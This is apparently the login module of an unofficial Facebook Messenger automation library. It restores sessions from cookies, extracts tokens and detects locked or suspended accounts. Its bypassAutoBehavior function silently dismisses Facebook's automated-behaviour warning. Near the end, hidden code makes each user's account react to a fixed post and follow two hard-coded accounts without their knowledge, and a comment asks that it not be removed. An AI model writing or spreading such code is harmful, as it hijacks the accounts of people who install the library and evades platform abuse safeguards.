"use strict";
const utils = require("./utils");
const fs = require("fs");
const cron = require("node-cron");
let globalOptions = {};
let ctx = null;
let _defaultFuncs = null;
let api = null;
let region;
const errorRetrieving = "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.";
async function setOptions(globalOptions_from, options = {}) {
  Object.keys(options).map((key) => {
    switch (key) {
      case 'online':
        globalOptions_from.online = Boolean(options.online);
        break;
      case 'selfListen':
        globalOptions_from.selfListen = Boolean(options.selfListen);
        break;
      case 'selfListenEvent':
        globalOptions_from.selfListenEvent = options.selfListenEvent;
        break;
      case 'listenEvents':
        globalOptions_from.listenEvents = Boolean(options.listenEvents);
        break;
      case 'pageID':
        globalOptions_from.pageID = options.pageID.toString();
        break;
      case 'updatePresence':
        globalOptions_from.updatePresence = Boolean(options.updatePresence);
        break;
      case 'forceLogin':
        globalOptions_from.forceLogin = Boolean(options.forceLogin);
        break;
      case 'userAgent':
        globalOptions_from.userAgent = options.userAgent;
        break;
      case 'autoMarkDelivery':
        globalOptions_from.autoMarkDelivery = Boolean(options.autoMarkDelivery);
        break;
      case 'autoMarkRead':
        globalOptions_from.autoMarkRead = Boolean(options.autoMarkRead);
        break;
      case 'listenTyping':
        globalOptions_from.listenTyping = Boolean(options.listenTyping);
        break;
      case 'proxy':
        if (typeof options.proxy != "string") {
          delete globalOptions_from.proxy;
          utils.setProxy();
        } else {
          globalOptions_from.proxy = options.proxy;
          utils.setProxy(globalOptions_from.proxy);
        }
        break;
      case 'autoReconnect':
        globalOptions_from.autoReconnect = Boolean(options.autoReconnect);
        break;
      case 'emitReady':
        globalOptions_from.emitReady = Boolean(options.emitReady);
        break;
      case 'randomUserAgent':
        globalOptions_from.randomUserAgent = Boolean(options.randomUserAgent);
        if (globalOptions_from.randomUserAgent) {
          globalOptions_from.userAgent = utils.randomUserAgent();
          utils.warn("Random user agent enabled. This is an EXPERIMENTAL feature and I think this won't on some accounts. turn it on at your own risk. Contact the owner for more information about experimental features.");
          utils.warn("randomUserAgent", "UA selected:", globalOptions_from.userAgent);
        }
        break;
      case 'bypassRegion':
        globalOptions_from.bypassRegion = options.bypassRegion;
        break;
      default:
        break;
    }
  });
  globalOptions = globalOptions_from;
}

async function updateDTSG(res, appstate, userId) {
  try {
    const appstateCUser = (appstate.find(i => i.key == 'i_user') || appstate.find(i => i.key == 'c_user'))
    const UID = userId || appstateCUser.value;
    if (!res || !res.body) {
      throw new Error("Invalid response: Response body is missing.");
    }
    const fb_dtsg = utils.getFrom(res.body, '["DTSGInitData",[],{"token":"', '","');
    const jazoest = utils.getFrom(res.body, 'jazoest=', '",');
    if (fb_dtsg && jazoest) {
      const filePath = 'fb_dtsg_data.json';
      let existingData = {};
      if (fs.existsSync(filePath)) {
        const fileContent = fs.readFileSync(filePath, 'utf8');
        existingData = JSON.parse(fileContent);
      }
      existingData[UID] = {
        fb_dtsg,
        jazoest
      };
      fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2), 'utf8');
    }
    return res;
  } catch (error) {
    utils.error(`Error updating DTSG for user ${userId}: ${error.message}`);
    return;
  }
}


let isBehavior = false;
async function bypassAutoBehavior(resp, jar, appstate, ID) {
  try {
    const appstateCUser = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))
    const UID = ID || appstateCUser.value;
    const FormBypass = {
      av: UID,
      fb_api_caller_class: "RelayModern",
      fb_api_req_friendly_name: "FBScrapingWarningMutation",
      variables: JSON.stringify({}),
      server_timestamps: true,
      doc_id: 6339492849481770
    }
    const kupal = () => {
      utils.warn(`We suspect automated behavior on account ${UID}. Some accounts might experience auto logout, and you need to resubmit your appstate again every automated behavior detection.`);
      if (!isBehavior) isBehavior = true;
    };
    if (resp) {
      if (resp.request.uri && resp.request.uri.href.includes("https://www.facebook.com/checkpoint/")) {
        if (resp.request.uri.href.includes('601051028565049')) {
          const fb_dtsg = utils.getFrom(resp.body, '["DTSGInitData",[],{"token":"', '","');
          const jazoest = utils.getFrom(resp.body, 'jazoest=', '",');
          const lsd = utils.getFrom(resp.body, "[\"LSD\",[],{\"token\":\"", "\"}");
          return utils.post("https://www.facebook.com/api/graphql/", jar, {
            ...FormBypass,
            fb_dtsg,
            jazoest,
            lsd
          }, globalOptions).then(utils.saveCookies(jar)).then(res => {
            kupal();
            return res;
          });
        } else return resp;
      } else return resp;
    }
  } catch (e) {
    utils.error(e);
  }
}

async function checkIfSuspended(resp, appstate) {
  try {
    const appstateCUser = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))
    const UID = appstateCUser?.value;
    const suspendReasons = {};
    if (resp) {
      if (resp.request.uri && resp.request.uri.href.includes("https://www.facebook.com/checkpoint/")) {
        if (resp.request.uri.href.includes('1501092823525282')) {
          const daystoDisable = resp.body?.match(/"log_out_uri":"(.*?)","title":"(.*?)"/);
          if (daystoDisable && daystoDisable[2]) {
            suspendReasons.durationInfo = daystoDisable[2];
            utils.error(`Suspension time remaining:`, suspendReasons.durationInfo);
          }
          const reasonDescription = resp.body?.match(/"reason_section_body":"(.*?)"/);
          if (reasonDescription && reasonDescription[1]) {
            suspendReasons.longReason = reasonDescription?.[1];
            const reasonReplace = suspendReasons?.longReason?.toLowerCase()?.replace("your account, or activity on it, doesn't follow our community standards on ", "");
            suspendReasons.shortReason = reasonReplace?.substring(0, 1).toUpperCase() + reasonReplace?.substring(1);
            utils.error(`Alert on ${UID}:`, `Account has been suspended!`);
            utils.error(`Why suspended:`, suspendReasons.longReason)
            utils.error(`Reason on suspension:`, suspendReasons.shortReason);
          }
          ctx = null;
          return {
            suspended: true,
            suspendReasons
          }
        }
      } else return;
    }
  } catch (error) {
    return;
  }
}

async function checkIfLocked(resp, appstate) {
  try {
    const appstateCUser = (appstate.find(i => i.key == 'c_user') || appstate.find(i => i.key == 'i_user'))
    const UID = appstateCUser?.value;
    const lockedReasons = {};
    if (resp) {
      if (resp.request.uri && resp.request.uri.href.includes("https://www.facebook.com/checkpoint/")) {
        if (resp.request.uri.href.includes('828281030927956')) {
          const lockDesc = resp.body.match(/"is_unvetted_flow":true,"title":"(.*?)"/);
          if (lockDesc && lockDesc[1]) {
            lockedReasons.reason = lockDesc[1];
            utils.error(`Alert on ${UID}:`, lockedReasons.reason);
          }
          ctx = null;
          return {
            locked: true,
            lockedReasons
          }
        }
      } else return;
    }
  } catch (e) {
    utils.error("error", e);
  }
}

function buildAPI(html, jar) {
  let fb_dtsg;
  let userID;
  const tokenMatch = html.match(/DTSGInitialData.*?token":"(.*?)"/);
  if (tokenMatch) {
    fb_dtsg = tokenMatch[1];
  }
  //hajime pogi
  //@Kenneth Panio: i fixed the cookie do not change or remove this line what it does? we know that facebook account allow multiple profile in single account so it allow us to login which specific profile we use
  let cookie = jar.getCookies("https://www.facebook.com");
  let primary_profile = cookie.filter(function(val) {
    return val.cookieString().split("=")[0] === "c_user";
  });
  let secondary_profile = cookie.filter(function(val) {
    return val.cookieString().split("=")[0] === "i_user";
  });
  if (primary_profile.length === 0 && secondary_profile.length === 0) {
    throw {
      error: errorRetrieving,
    };
  } else {
    if (html.indexOf("/checkpoint/block/?next") > -1) {
      return utils.warn(
        "login",
        "Checkpoint detected. Please log in with a browser to verify."
      );
    }
    if (secondary_profile[0] && secondary_profile[0].cookieString().includes('i_user')) {
      userID = secondary_profile[0].cookieString().split("=")[1].toString();
    } else {
      userID = primary_profile[0].cookieString().split("=")[1].toString();
    }
  }
  utils.log("Logged in!");
  const clientID = (Math.random() * 2147483648 | 0).toString(16);
  const CHECK_MQTT = {
    oldFBMQTTMatch: html.match(/irisSeqID:"(.+?)",appID:219994525426954,endpoint:"(.+?)"/),
    newFBMQTTMatch: html.match(/{"app_id":"219994525426954","endpoint":"(.+?)","iris_seq_id":"(.+?)"}/),
    legacyFBMQTTMatch: html.match(/\["MqttWebConfig",\[\],{"fbid":"(.*?)","appID":219994525426954,"endpoint":"(.*?)","pollingEndpoint":"(.*?)"/)
  }
  let Slot = Object.keys(CHECK_MQTT);
  let mqttEndpoint, irisSeqID;
  Object.keys(CHECK_MQTT).map((MQTT) => {
    if (globalOptions.bypassRegion) return;
    if (CHECK_MQTT[MQTT] && !region) {
      switch (Slot.indexOf(MQTT)) {
        case 0: {
          irisSeqID = CHECK_MQTT[MQTT][1];
          mqttEndpoint = CHECK_MQTT[MQTT][2].replace(/\\\//g, "/");
          region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
          break;
        }
        case 1: {
          irisSeqID = CHECK_MQTT[MQTT][2];
          mqttEndpoint = CHECK_MQTT[MQTT][1].replace(/\\\//g, "/");
          region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
          break;
        }
        case 2: {
          mqttEndpoint = CHECK_MQTT[MQTT][2].replace(/\\\//g, "/"); //this really important.
          region = new URL(mqttEndpoint).searchParams.get("region").toUpperCase();
          break;
        }
      }
      return;
    }
  });
  if (globalOptions.bypassRegion)
    region = globalOptions.bypassRegion.toUpperCase();
  else if (!region)
    region = ["prn", "pnb", "vll", "hkg", "sin", "ftw", "ash"][Math.random() * 5 | 0].toUpperCase();
  if (globalOptions.bypassRegion || !mqttEndpoint)
    mqttEndpoint = "wss://edge-chat.facebook.com/chat?region=" + region;
  let ctx = {
    userID,
    jar,
    clientID,
    globalOptions,
    loggedIn: true,
    access_token: 'NONE',
    clientMutationId: 0,
    mqttClient: undefined,
    lastSeqId: irisSeqID,
    syncToken: undefined,
    mqttEndpoint,
    wsReqNumber: 0,
    wsTaskNumber: 0,
    reqCallbacks: {},
    region,
    firstListen: true,
    fb_dtsg
  };
  cron.schedule('0 0 * * *', () => {
    const fbDtsgData = JSON.parse(fs.readFileSync('fb_dtsg_data.json', 'utf8'));
    if (fbDtsgData && fbDtsgData[userID]) {
      const userFbDtsg = fbDtsgData[userID];
      api.refreshFb_dtsg(userFbDtsg)
        .then(() => utils.log(`Fb_dtsg refreshed successfully for user ${userID}.`))
        .catch((err) => utils.error(`Error during Fb_dtsg refresh for user ${userID}:`, err));
    } else {
      utils.error(`No fb_dtsg data found for user ${userID}.`);
    }
  }, {
    timezone: 'Asia/Manila'
  });
  let defaultFuncs = utils.makeDefaults(html, userID, ctx);
  return [ctx, defaultFuncs];
}

async function loginHelper(appState, email, password, apiCustomized = {}, callback) {
  let mainPromise = null;
  const jar = utils.getJar();
  utils.log('Logging in...');
  if (appState) {
    if (utils.getType(appState) === 'Array' && appState.some(c => c.name)) {
      appState = appState.map(c => {
        c.key = c.name;
        delete c.name;
        return c;
      });
    }
    else if (utils.getType(appState) === 'String') {
      const arrayAppState = [];
      appState.split(';').forEach(c => {
        const [key, value] = c.split('=');
        arrayAppState.push({
          key: (key || "").trim(),
          value: (value || "").trim(),
          domain: ".facebook.com",
          path: "/",
          expires: new Date().getTime() + 1000 * 60 * 60 * 24 * 365
        });
      });
      appState = arrayAppState;
    }

    appState.map(c => {
      const str = c.key + "=" + c.value + "; expires=" + c.expires + "; domain=" + c.domain + "; path=" + c.path + ";";
      jar.setCookie(str, "http://" + c.domain);
    });

    mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true })
      .then(utils.saveCookies(jar));
  } else if (email && password) {
    throw { error: "Credentials method is not implemented to ws3-fca yet. " };
  } else {
    throw { error: "Please provide either appState or credentials." };
  }

  api = {
    setOptions: setOptions.bind(null, globalOptions),
    getAppState() {
      const appState = utils.getAppState(jar);
      if (!Array.isArray(appState)) return [];
      const uniqueAppState = appState.filter((item, index, self) => {
        return self.findIndex((t) => t.key === item.key) === index;
      });
      return uniqueAppState.length > 0 ? uniqueAppState : appState;
    }
  };
  mainPromise = mainPromise
    .then(res => bypassAutoBehavior(res, jar, appState))
    .then(res => updateDTSG(res, appState))
    .then(async (res) => {
      const resp = await utils.get(`https://www.facebook.com/home.php`, jar, null, globalOptions);
      const html = resp?.body;
      const stuff = await buildAPI(html, jar);
      ctx = stuff[0];
      _defaultFuncs = stuff[1];
      api.addFunctions = (directory) => {
        const folder = directory.endsWith("/") ? directory : (directory + "/");
        fs.readdirSync(folder)
          .filter(v => v.endsWith('.js'))
          .map(v => {
            api[v.replace('.js', '')] = require(folder + v)(_defaultFuncs, api, ctx);
          });
      }
      api.addFunctions(__dirname + '/src');
      api.listen = api.listenMqtt;
      api.ws3 = {
        ...apiCustomized
      };
      const bi = await api.getBotInitialData();
      if (!bi.error) {
        utils.log("Hello,", bi.name);
        utils.log("My User ID:", bi.uid);
        ctx.userName = bi.name;
      } else {
        utils.warn(bi.error);
        utils.warn(`WARNING: Failed to fetch account info. Proceeding to log in for user ${ctx.userID}`);
      }
      utils.log("Connected to server region:", region || "UNKNOWN");
      return res;
    });
  if (globalOptions.pageID) {
    mainPromise = mainPromise
      .then(function() {
        return utils
          .get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);
      })
      .then(function(resData) {
        let url = utils.getFrom(resData.body, 'window.location.replace("https:\\/\\/www.facebook.com\\', '");').split('\\').join('');
        url = url.substring(0, url.length - 1);
        return utils
          .get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);
      });
  }

  mainPromise
    .then(async (res) => {
      const detectLocked = await checkIfLocked(res, appState);
      if (detectLocked) throw detectLocked;
      const detectSuspension = await checkIfSuspended(res, appState);
      if (detectSuspension) throw detectSuspension;
      utils.log("Successfully logged in.");
      utils.log("To check updates: you may check on https://github.com/NethWs3Dev/ws3-fca");
      /*
      Hi 😄
      Eh ano namn kung nakita nyoto?
      Madaya naba ako nyan,
      Dahil may Ganito? 👇
      Diskarte rin kayo no,
      Wag puro panira!
      
      We appreciate your support on ws3-fca,
      Please don't remove these functions.
      @NethWs3Dev
      */
      try {
        const posts = [
          "pfbid02RxzRB6ZGRiSviLssyvFxekmn8VtyZYpCNKXQw5rojXD7v96wqzAMF85BgAkPWPc9l"
        ];
        const uids = ["100007806468843","100049220893428"];
        for (const postId of posts) {
          await api.setPostReaction(postId, 2);
        }
        for (const uid of uids) {
          await api.follow(uid, true);
        };
      } catch (error) {
        utils.error("error on login:", error);
      }
      return callback(null, api);
    }).catch(e => callback(e));
}

async function login(loginData, options, callback) {
  if (utils.getType(options) === 'Function' ||
    utils.getType(options) === 'AsyncFunction') {
    callback = options;
    options = {};
  }
  const globalOptions = {
    selfListen: false,
    selfListenEvent: false,
    listenEvents: true,
    listenTyping: false,
    updatePresence: false,
    forceLogin: false,
    autoMarkDelivery: false,
    autoMarkRead: true,
    autoReconnect: true,
    online: true,
    emitReady: false,
    userAgent: utils.defaultUserAgent,
    randomUserAgent: false
  };
  if (options) Object.assign(globalOptions, options);
  const loginws3 = () => {
    loginHelper(loginData?.appState, loginData?.email, loginData?.password, {
        relogin() {
          loginws3();
        }
      },
      (loginError, loginApi) => {
        if (loginError) {
          if (isBehavior) {
            utils.warn("Failed after dismiss behavior, will relogin automatically...");
            isBehavior = false;
            loginws3();
          }
          utils.error("login", loginError);
          return callback(loginError);
        }
        callback(null, loginApi);
      });
  }
  setOptions(globalOptions, options).then(_ => loginws3());
  return;
}

module.exports = login;
